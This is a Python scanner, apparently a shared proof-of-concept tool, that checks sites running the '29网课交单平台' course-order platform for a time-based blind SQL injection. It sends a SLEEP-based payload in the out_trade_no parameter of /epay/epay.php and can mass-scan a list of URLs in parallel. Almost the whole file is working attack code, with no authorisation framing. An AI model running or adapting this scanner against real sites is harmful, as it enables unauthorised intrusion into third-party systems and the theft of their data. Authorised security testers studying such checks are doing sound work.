import argparse
from multiprocessing import Pool
import requests
import time

# 禁用HTTPS警告
requests.packages.urllib3.disable_warnings()


# 核心检测函数
def check(target):
    target = f"{target}"
    vulnurl = target + "/epay/epay.php"

    # 设置请求头
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close'
    }

    # SQL注入的payload（通过out_trade_no参数进行注入）
    data = {
        'out_trade_no': "' AND (SELECT 8078 FROM (SELECT(SLEEP(5)))eEcA) AND 'aEmC'='aEmC"
    }

    try:
        # 记录开始时间
        start_time = time.time()
        response = requests.post(vulnurl, headers=headers, verify=False, data=data)
        response_time = time.time() - start_time  # 计算响应时间

        # 判断响应时间和状态码
        if response.status_code == 200 and response_time > 5:
            print(f"存在漏洞: {target}, 响应时间: {response_time:.2f}s")
        else:
            print(f"不存在漏洞: {target}, 响应时间: {response_time:.2f}s")

    except requests.exceptions.RequestException as e:
        print(f"请求超时或连接失败: {e}")


# 主函数
def main():
    banner = """ 
  _____    ______                                   ______     ___      _____     
 / ___ `..' ____ '.                               .' ____ \  .'   `.   |_   _|    
|_/___) || (____) | .---.  _ .--.   ,--.    _   __| (___ \_|/  .-.  \    | |      
 .'____.''_.____. |/ /__\\[ '/'`\ \`'_\ :  [ \ [  ]_.____`. | |   | |    | |   _  
/ /_____ | \____| || \__., | \__/ |// | |,  \ '/ /| \____) |\  `-'  \_  _| |__/ | 
|_______| \______,' '.__.' | ;.__/ \'-;__/[\_:  /  \______.' `.___.\__||________| 
                          [__|             \__.'                                  
                                                                         by:TppxIi
    """
    print(banner)
    parse = argparse.ArgumentParser(description="29网课交单平台SQL注入检测")
    parse.add_argument('-u', '--url', type=str, help="目标单个URL")
    parse.add_argument('-f', '--file', type=str, help="URL文件")
    args = parse.parse_args()

    url = args.url
    file = args.file
    urls = []

    # 判断是单个URL还是文件URL列表
    if url:
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        urls.append(url)
    elif file:
        with open(file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line.startswith(('http://', 'https://')):
                    line = f"http://{line}"
                urls.append(line)

    # 根据输入执行不同的处理
    if urls:
        if url:  # 如果是单个URL检查
            for u in urls:
                check(u)
        else:  # 文件URL批量处理，使用多线程加速
            with Pool(10) as pool:
                pool.starmap(check, [(u,) for u in urls])


if __name__ == '__main__':
    main()
